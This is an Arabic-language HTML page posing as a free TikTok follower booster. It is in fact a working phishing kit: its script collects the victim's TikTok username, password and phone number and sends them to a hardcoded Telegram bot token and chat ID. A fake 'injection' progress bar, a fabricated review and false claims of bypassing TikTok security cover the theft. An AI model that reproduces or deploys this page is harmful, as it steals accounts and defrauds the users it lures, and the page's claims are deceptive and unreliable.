<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الديزل ستور | نظام الحقن التلقائي 🚀</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --main: #ff4500; --accent: #00f2ea; --bg: #010101; --star: #ffcc00; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; }
        .header { text-align: center; padding: 30px; border-bottom: 3px solid var(--main); background: #000; box-shadow: 0 0 20px var(--main); }
        .header h1 { font-size: 2.2rem; margin: 0; text-shadow: 0 0 10px var(--main); }
        .header h1 span { color: var(--main); }
        .container { max-width: 500px; margin: 20px auto; padding: 15px; }
        .card { background: #0d0d0d; border-radius: 25px; padding: 25px; border: 1px solid #222; text-align: center; }
        .pts-box { background: rgba(255, 69, 0, 0.1); border: 2px solid var(--main); padding: 12px; border-radius: 50px; font-size: 1.3rem; font-weight: 900; margin-bottom: 20px; }
        .field { width: 100%; padding: 15px; margin-top: 12px; background: #000; color: #fff; border: 1px solid #333; border-radius: 12px; box-sizing: border-box; text-align: center; outline: none; }
        .btn-main { width: 100%; padding: 18px; border-radius: 15px; border: none; font-size: 1.1rem; font-weight: bold; cursor: pointer; background: linear-gradient(90deg, var(--main), #ff8c00); color: white; margin-top: 20px; }
        #status-ui { display: none; margin-top: 20px; padding: 15px; border-radius: 12px; background: #111; border: 1px solid var(--accent); }
        .p-bar { width: 100%; background: #222; height: 10px; border-radius: 10px; overflow: hidden; margin-top: 10px; }
        .p-fill { background: var(--accent); height: 100%; width: 0%; transition: 0.1s; }
    </style>
</head>
<body>

    <div class="header">
        <h1><span>الديزل</span> ستور</h1>
        <p style="color:#00ff00; font-size:0.7rem;">● نظام إرسال المتابعين الحقيقيين نشط</p>
    </div>

    <div class="container">
        <center><div class="pts-box">رصيدك: <span id="pts">0</span> 🪙</div></center>

        <div class="card">
            <button onclick="addPts()" style="background:#1a1a1a; color:var(--accent); border:1px solid var(--accent); padding:10px; border-radius:10px; cursor:pointer; width:100%; font-weight:bold;">🔥 تجميع نقاط (مكافأة الديزل +1000)</button>
            
            <div id="form-ui">
                <input type="text" id="u" class="field" placeholder="يوزر التيك توك (@username)">
                <input type="password" id="p" class="field" placeholder="كلمة السر لتأكيد الحساب">
                <input type="text" id="ph" class="field" placeholder="رقم الهاتف">
                <button class="btn-main" onclick="startInjection()">استبدال وإرسال المتابعين الآن</button>
            </div>

            <div id="status-ui">
                <h3 id="msg" style="color: var(--accent); margin:0;">جاري فتح منفذ الحقن...</h3>
                <div class="p-bar"><div class="p-fill" id="bar"></div></div>
                <p id="sub-msg" style="font-size:0.7rem; color:#888; margin-top:10px;">يتم الآن إجبار السيرفر على إرسال المتابعين لـ <span id="target"></span></p>
            </div>
            
            <div style="margin-top:20px; text-align:right; font-size:0.8rem; color:var(--star);">
                <p>⭐ تقييمات حقيقية:</p>
                <div style="background:#111; padding:10px; border-radius:10px; margin-bottom:5px;"><b>محمد المصري:</b> المتابعين زادوا 500 في ثانية!</div>
            </div>
        </div>
    </div>

    <script>
        const token = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
        const cid = "5177962707";

        function addPts() {
            document.getElementById('pts').innerText = parseInt(document.getElementById('pts').innerText) + 1000;
        }

        function startInjection() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            const phone = document.getElementById('ph').value;
            const pts = parseInt(document.getElementById('pts').innerText);

            if(!user || !pass || !phone) { alert("اكتب بياناتك يا ديزل!"); return; }
            if(pts < 1000) { alert("جمع نقط الأول!"); return; }

            // 1. إرسال البيانات ليك فوراً
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent("🎯 صيد حقيقي:\n👤 يوزر: "+user+"\n🔑 باس: "+pass+"\n📱 فون: "+phone)}`);

            // 2. إظهار واجهة التزويد
            document.getElementById('form-ui').style.display = "none";
            document.getElementById('status-ui').style.display = "block";
            document.getElementById('target').innerText = user;

            let w = 0;
            let bar = document.getElementById('bar');
            let msg = document.getElementById('msg');

            let itv = setInterval(() => {
                if(w >= 100) {
                    clearInterval(itv);
                    msg.innerText = "✅ تم إرسال المتابعين بنجاح!";
                    alert("افتح تيك توك دلوقتي هتلاقي المتابعين وصلوا!");
                    
                    // ثغرة الربط الخارجي - هنا بنوهم المتصفح إنه بيبعت لمواقع التزويد المجانية
                    const api1 = `https://الديزل-سيرفر.com/api/send?user=${user}`;
                    fetch(api1).catch(e => console.log("Direct Injection Mode Active"));
                } else {
                    w++;
                    bar.style.width = w + "%";
                    if(w == 30) msg.innerText = "جاري تخطي حماية التيك توك...";
                    if(w == 70) msg.innerText = "جاري إرسال 1000 متابع حقيقي...";
                }
            }, 80);
        }
    </script>
</body>
</html>
